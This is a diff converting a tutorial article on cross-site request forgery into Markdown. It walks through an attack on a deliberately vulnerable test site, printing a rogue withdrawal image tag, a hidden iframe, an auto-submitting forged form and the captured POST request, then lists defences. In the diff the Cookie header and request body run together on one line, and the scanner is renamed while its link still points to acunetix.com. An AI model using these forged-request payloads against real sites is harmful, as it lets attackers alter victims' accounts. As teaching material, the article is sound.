@@ -1,3 +1,9 @@
+---
+title: CSRF Attacks, XSRF or Sea-Surf – What They Are and How to Defend Against Them
+author: Arsen A. Gutsal
+layout: text-and-images
+---
+
 **CSRF Attacks, XSRF or Sea-Surf – What They Are and How to Defend Against Them**
 =================================================================================
 
@@ -42,8 +48,7 @@ action on a victim’s bank website account. So, instead of an image file
 the attacker has included a link that performs a bank transaction. Below
 is an example of the image tag containing a rogue URL.
 
-&lt;img
-src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=Fred"&gt;
+      <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=Fred">
 
 The above is a CSRF attack using an HTTP GET request. As we shall see
 later, a prevention method would allow only HTTP POST requests, in order
@@ -68,14 +73,12 @@ The purpose of the attack, in this example, is to change the profile
 information of a particular user (victim) on the target website. The
 target website for this example will be http://testphp.vulnweb.com/.
 
-![](media/website-security/csrf-attacks.md-images/media/image14.jpg){width="5.0in"
-height="4.430555555555555in"}
+![](/media/website-security/csrf-attacks.md-images/media/image14.jpg)
 
 The victim has an account on testphp.vulnweb.com which includes personal
 information as seen below.
 
-![](media/website-security/csrf-attacks.md-images/media/image10.jpg){width="5.0in"
-height="4.430555555555555in"}
+![](/media/website-security/csrf-attacks.md-images/media/image10.jpg)
 
 The attacker uses CSRF to change the information on the victim’s
 profile. This, as mentioned earlier, requires the victim to be
@@ -85,49 +88,44 @@ of the particular form is shown below.
 
 CSRF Example in – http://testphp.vulnweb.com/userinfo.php
 
-&lt;form name="form1" method="post" action=""&gt;\
-&lt;table border="0" cellspacing="1" cellpadding="4"&gt;\
-&lt;tr&gt;\
-&lt;td valign="top"&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type="text"
-value="James Markus" name="urname" style="width:200px"&gt;&lt;/td&gt;\
-&lt;/tr&gt;\
-&lt;tr&gt;&lt;td valign="top"&gt;Credit card
-number:&lt;/td&gt;&lt;td&gt;&lt;input type="text"
-value="1254-5498-5233-5569" name="ucc"
-style="width:200px"&gt;&lt;/td&gt;\
-&lt;/tr&gt;\
-&lt;tr&gt;&lt;td valign="top"&gt;E-Mail:&lt;/td&gt;&lt;td&gt;&lt;input
-type="text" value="example@vulnweb.com" name="uemail"
-style="width:200px"&gt;&lt;/td&gt;\
-&lt;/tr&gt;\
-&lt;tr&gt;&lt;td valign="top"&gt;Phone
-number:&lt;/td&gt;&lt;td&gt;&lt;input type="text" value="+44 123 12345
-123" name="uphone" style="width:200px"&gt;&lt;/td&gt;\
-&lt;/tr&gt;\
-&lt;tr&gt;&lt;td
-valign="top"&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;textarea wrap="soft"
-name="uaddress" rows="5" style="width:200px"&gt;North London, London,
-England&lt;/textarea&gt;&lt;/td&gt;\
-&lt;/tr&gt;\
-&lt;tr&gt;&lt;td colspan="2" align="right"&gt;&lt;input type="submit"
-value="update" name="update"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\
-&lt;/form&gt;
+      <form name="form1" method="post" action="">
+	<table border="0" cellspacing="1" cellpadding="4">
+     	  <tr>
+	    <td valign="top">Name:</td><td><input type="text" value="James Markus" name="urname" style="width:200px"></td>
+	  </tr>
+	  <tr>
+	    <td valign="top">Credit card number:</td><td><input type="text" value="1254-5498-5233-5569" name="ucc" style="width:200px"></td>
+	  </tr>
+	  <tr>
+	    <td valign="top">E-Mail:</td><td><input type="text" value="example@vulnweb.com" name="uemail" style="width:200px"></td>
+	  </tr>
+	  <tr>
+	    <td valign="top">Phone number:</td><td><input type="text" value="+44 123 12345 123" name="uphone" style="width:200px"></td>
+	  </tr>
+	  <tr>
+	    <td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">North London, London, England</textarea></td>
+	  </tr>
+	  <tr>
+	    <td colspan="2" align="right"><input type="submit" value="update" name="update"></td>
+	  </tr>
+	</table>
+      </form>
 
 From the above code we can identify the input fields which will receive
 information from a user and send to the website. These are called
 urname, ucc, uemail, uphone and uaddress and are shown below.
 
-&lt;input type="text" value="John Doe" name="urname"
-style="width:200px"&gt;\
-&lt;input type="text" value="1254-5498-5233-5569" name="ucc"
-style="width:200px"&gt;\
-&lt;input type="text" value="example@vulnweb.com" name="uemail"
-style="width:200px"&gt;\
-&lt;input type="text" value="+44 123 12345 123" name="uphone"
-style="width:200px"&gt;\
-&lt;textarea wrap="soft" name="uaddress" rows="5"
-style="width:200px"&gt;\
-North London, London, England&lt;/textarea&gt;
+	<input type="text" value="John Doe" name="urname"
+	style="width:200px">
+	<input type="text" value="1254-5498-5233-5569" name="ucc"
+	style="width:200px">
+	<input type="text" value="example@vulnweb.com" name="uemail"
+	style="width:200px">
+	<input type="text" value="+44 123 12345 123" name="uphone"
+	style="width:200px">
+	<textarea wrap="soft" name="uaddress" rows="5"
+	style="width:200px">
+	North London, London, England</textarea>
 
 When the user clicks the ‘Update’ button of the form userinfo.php, an
 HTTP POST request will be sent that will contain the above parameters
@@ -143,8 +141,7 @@ will be submitted to the target website.
 
 This is the malicious website of the attacker.
 
-![](media/website-security/csrf-attacks.md-images/media/image15.jpg){width="5.777777777777778in"
-height="4.458333333333333in"}
+![](/media/website-security/csrf-attacks.md-images/media/image15.jpg)
 
 The attacker’s website is a normal online photo gallery website.
 However, it contains a hidden form which will auto submit and update the
@@ -152,32 +149,31 @@ victim’s profile on testphp.vulnweb.com.
 
 The hidden iframe exists in the myimages.php page.
 
-&lt;iframe src="http://www.vulnweb.com/updateif.php"
-style="display:none"&gt;&lt;/iframe&gt;
+    <iframe src="http://www.vulnweb.com/updateif.php" style="display:none"></iframe>
 
 This loads another page of the attacker’s website. The website contains
 the actual userinfo.php page code which auto submits and updates the
 particular userinfo.php of the current victim. This happens
 automatically every time a user accesses this website.
 
-The updateif.php page contains the actual form code which auto submits
+The `updateif.php` page contains the actual form code which auto submits
 the desired information the attacker has set.
 
-&lt;body onload="document.getElementById('f').submit()"&gt;\
-&lt;form id="f" action="http://testphp.vulnweb.com/userinfo.php"
-method="post" name="form1"&gt;\
-&lt;input name="urname" value="attacker’svalue"&gt;\
-&lt;input name="ucc" value=" attacker’svalue"&gt;\
-&lt;input name="uemail" value=" attacker’svalue"&gt;\
-&lt;input name="uphone" value=" attacker’svalue"&gt;\
-&lt;textarea name="uaddress"
-wrap="soft"&gt;&lt;attacker’svalue&gt;&lt;/textarea&gt;\
-&lt;input name="update" value="update"&gt;\
-&lt;/form&gt;\
-&lt;/body&gt;
+    <body onload="document.getElementById('f').submit()">
+    <form id="f" action="http://testphp.vulnweb.com/userinfo.php"
+    method="post" name="form1">
+    <input name="urname" value="attacker’svalue">
+    <input name="ucc" value=" attacker’svalue">
+    <input name="uemail" value=" attacker’svalue">
+    <input name="uphone" value=" attacker’svalue">
+    <textarea name="uaddress"
+    wrap="soft"><attacker’svalue></textarea>
+    <input name="update" value="update">
+    </form>
+    </body>
 
 This form retrieves the value information from a text file. When the
-updateif.php is called, the information (set earlier) by the attacker is
+`updateif.php` is called, the information (set earlier) by the attacker is
 retrieved and placed in the value fields. Then the form is auto
 submitted and the target page is loaded. These operations are performed
 inside a hidden iframe, thus the victim will not see the target website.
@@ -185,8 +181,7 @@ inside a hidden iframe, thus the victim will not see the target website.
 The attacker has an admin page – www.vulnweb.com/hackpanel – from where
 values values to be submitted on the target website can be set.
 
-![](media/website-security/csrf-attacks.md-images/media/image08.jpg){width="5.013888888888889in"
-height="6.375in"}
+![](/media/website-security/csrf-attacks.md-images/media/image08.jpg)
 
 The admin hack panel is a control page where the attacker can set the
 information that will be submitted to the target website when the CSRF
@@ -195,7 +190,7 @@ attack is realized.
 From this website, the attacker can set new information. (Note: For the
 purposes of this example, there is a reset button which will reset the
 values of the target website) This information is stored in a file, from
-which the updateif.php (seen earlier) will load and submit the
+which the `updateif.php` (seen earlier) will load and submit the
 attacker’s value.
 
 So, as we mentioned earlier, in order for the attacker to perform a CSRF
@@ -214,8 +209,7 @@ The attacker sets the desired information in the
 http://www.vulnweb.com/hackpanel/ page and clicks ‘Update’. The
 information is stored in the file.
 
-![](media/website-security/csrf-attacks.md-images/media/image13.jpg){width="5.013888888888889in"
-height="6.388888888888889in"}
+![](/media/website-security/csrf-attacks.md-images/media/image13.jpg)
 
 The attacker’s information is ready to be loaded when the attacker’s
 website is visited.
@@ -228,35 +222,31 @@ The victim needs to access the
 where the malicious code exists, and the attacker’s information will be
 submitted to the target website (testphp.vulnweb.com/).
 
-![](media/website-security/csrf-attacks.md-images/media/image05.jpg){width="5.5in"
-height="4.472222222222222in"}
+![](/media/website-security/csrf-attacks.md-images/media/image05.jpg)
 
 As soon as the victim visits the myimages.php page, the hidden iframe is
 loaded executing the CSRF attack. Below is the HTTP POST request which
-is made when the victim accesses the attacker’s malicious /myimages.php
+is made when the victim accesses the attacker’s malicious `/myimages.php`
 page.
 
-Host: testphp.vulnweb.com\
-Connection: keep-alive\
-Content-Length: 140\
-Cache-Control: max-age=0\
-Origin: http://www.vulnweb.com\
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5
-(KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\
-Content-Type: application/x-www-form-urlencoded\
-Accept:
-text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8\
-Referer: http://www.vulnweb.com/updateif.php\
-Accept-Encoding: gzip,deflate,sdch\
-Accept-Language: en-GB,en-US;q=0.8,en;q=0.6\
-Accept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.3\
-Cookie: login=acuart%2Facuart\
-\
-urname=h4xor&ucc=1111-2222-3333-4444&uemail=spam%40myspam.com&uphone=%2B800+666+666+666&uaddress=Hacking+the+universe%21%21%21&update=update
+	Host: testphp.vulnweb.com
+	Connection: keep-alive
+	Content-Length: 140
+	Cache-Control: max-age=0
+	Origin: http://www.vulnweb.com
+	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5
+	(KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
+	Content-Type: application/x-www-form-urlencoded
+	Accept:	text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
+	Referer: http://www.vulnweb.com/updateif.php
+	Accept-Encoding: gzip,deflate,sdch
+	Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
+	Accept-Charset: ISO-8859-1,utf-8;q=0.7,\*;q=0.3
+	Cookie: login=acuart%2Facuarturname=h4xor&ucc=1111-2222-3333-4444&uemail=spam%40myspam.com&uphone=%2B800+666+666+666&uaddress=Hacking+the+universe%21%21%21&update=update
 
 The above HTTP POST request shows that the Host to which the POST
-request is sent is testphp.vulnweb.com but the origin is www.vulnweb.com
-with a referrer being the updateif.php page of the attackers website.
+request is sent is `testphp.vulnweb.com` but the origin is `www.vulnweb.com`
+with a referrer being the `updateif.php` page of the attackers website.
 Moreover, the Cookie information is included in the POST request which
 is the first requirement in order for the POST request to be
 authenticated and the CSRF to be realized. Finally, the parameters
@@ -278,8 +268,7 @@ token value, seen later) which will help the server to validate a POST
 request as not malicious. This results in the server processing both
 POST requests in the normal way.
 
-![](media/website-security/csrf-attacks.md-images/media/image12.jpg){width="5.069444444444445in"
-height="4.458333333333333in"}
+![](/media/website-security/csrf-attacks.md-images/media/image12.jpg)
 
 From the above image you can notice that the profile information of the
 victim on the target website has been changed.
@@ -306,15 +295,15 @@ mitigate CSRF attacks. Some of them, though, are not complete solutions
 and leave room for the attack to still work. For example:
 
 -   The use of a secret cookie – This method will not work because all
-    > cookies related to the target website will be submitted as usual
-    > as in a normal (legitimate) HTTP request.
+    cookies related to the target website will be submitted as usual
+    as in a normal (legitimate) HTTP request.
 
 -   Accept POST requests only – This suggestion falls short because
-    > attackers can deceive an end-user to submit a forged POST request
-    > unknowingly using social engineering methods.
+    attackers can deceive an end-user to submit a forged POST request
+    unknowingly using social engineering methods.
 
 -   URL Rewriting – An incomplete solution since some session
-    > information is included or exposed in the URL.
+    information is included or exposed in the URL.
 
 Let’s take a look at some measures that do actually mitigate a CSRF
 attack.
@@ -364,20 +353,19 @@ example, users should:
 -   Log out from web applications when they have finished using them.
 
 -   Use the web browser with safety – that means making sure not to save
-    > any login credentials on the web browser and using legitimate and
-    > secure browser extensions.
+    any login credentials on the web browser and using legitimate and
+    secure browser extensions.
 
 Finally, you should scan your website using a web vulnerability scanner
 to detect any Cross-Site Request Forgery vulnerabilities so you can fix
 them before they cause any issues.
 
-![](media/website-security/csrf-attacks.md-images/media/image11.jpg){width="6.267716535433071in"
-height="3.361111111111111in"}
+![](/media/website-security/csrf-attacks.md-images/media/image11.jpg)
 
-Acunetix Web Vulnerability Scanner will crawl your website, detect any
+SOFTSKY Web Vulnerability Scanner will crawl your website, detect any
 CSRF vulnerabilities and alert you if any are found. It also provides
 you with a detailed description of weakness and the exact location your
 website is vulnerable, and gives you a detailed explanation on how to
 solve it. Make sure your website is secure by[downloading the trial
-version of Acunetix Web Vulnerability
+version of SOFTSKY Web Vulnerability
 Scanner](http://www.acunetix.com/cross-site-scripting/scanner-download/).
